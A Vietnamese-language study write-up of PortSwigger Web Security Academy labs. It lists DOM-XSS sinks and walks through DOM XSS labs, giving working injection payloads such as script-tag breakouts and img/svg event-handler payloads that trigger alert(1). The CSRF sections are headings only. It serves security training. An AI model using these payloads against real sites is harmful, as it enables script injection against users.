


* [Portswigger - Cross-site scripting](#pxss)


* [Portswigger - Cross-site request fogery](#pcsrf)
  - [1. CSRF vulnerability with no defenses](#pcsrf1)
  - [2. CSRF where token validation depends on request method](#pcsrf2)
  - [3. CSRF where token validation depends on token being present](#pcsrf3)
  - [4. CSRF where token is not tied to user session](#pcsrf4)
  - [5. CSRF where token is tied to non-session cookie](#pcsrf5)
  - [6. CSRF where token is duplicated in cookie](#pcsrf6)
  - [7. SameSite Lax bypass via method override](#pcsrf7)
  - [8. SameSite Strict bypass via client-side redirect](#pcsrf8)
  - [9. SameSite Strict bypass via sibling domain](#pcsrf9)
  - [10. SameSite Lax bypass via cookie refresh](#pcsrf10)
  - [11. CSRF where Referer validation depends on header being present](#pcsrf11)
  - [12. CSRF with broken Referer validation]()
   
## [1. CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)<a name='pcsrf1'></a>


# DOM-based vulnerabilities

Which sinks can lead to DOM-XSS vulnerabilities?

```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent

```
The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

## 1. DOM-based XSS 

###  1. Lab: DOM XSS in document.write sink using source location.search
 
Bài này sử dụng sink là document.write với souce từ location.search, có source code: 

![image](https://user-images.githubusercontent.com/104350480/224482812-01b1a31a-60be-45dd-bf1d-1a7029b029b5.png)

```
<script>
function trackSearch(query) {
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
  trackSearch(query);
}
</script>

```
Ta biết rằng có thể thực thi được code bên trong document.write() và cả nhiều script nên ở đây bypass đơn giản bằng cách dùng payload: 

"><script>alert(1)</script>

### [2. Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

![image](https://user-images.githubusercontent.com/104350480/224484597-6a2fc99a-eaea-4f6e-86dc-77be550f4cf8.png)

```
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
                            
```
source ở đây là location.search và sink ở đây là document.write, ở đây ta sẽ thực hiện xss ngay ở document.write đầu tiên bằng cách đóng tag <select> lại và thêm <script> vào
> mục tiêu là thực hiện document.write với : '<select name =""></select><script>alert(1)</script>'

Ta truyền tham số trên url để thực thi: ?productId=1&storeId="</select><script>alert(1)</script>

### [3. Lab: DOM XSS in innerHTML sink using source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

![image](https://user-images.githubusercontent.com/104350480/224485700-4b5dcee3-3309-4c1e-acdc-bb59990405ac.png)

soucre ở đây là location.search còn sink ở đây là innerHTML
innerHTML là một thuộc tính của các đối tượng HTML trong JavaScript, nó cho phép ta truy cập và chỉnh sửa nội dung HTML bên trong một phần tử HTML và ngoài ra Thuộc tính innerHTML trong JavaScript có thể thực thi được hầu hết các loại nội dung HTML, bao gồm các thẻ HTML, văn bản, hình ảnh, video, âm thanh và các phần tử khác của trang web.
Nên ta có thể tiêm script vào đây để thực thi alert, tuy vậy thì innerHTML nó block đi phần tử <script> nên ở đây  ta có thể dùng tag <img> or <svg> thay thế

> payload: <img src=0 onerror=alert(1)> or <svg><animate onbegin=alert(1)>

### [4. Lab: DOM XSS in jQuery anchor href attribute sink using location.search source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

Bài lab này chứa dom-based xss 

Kiểm tra mã nguồn:
![image](https://user-images.githubusercontent.com/104350480/224487372-765a1c62-75b5-4483-a08c-b2f20c02ebd5.png)




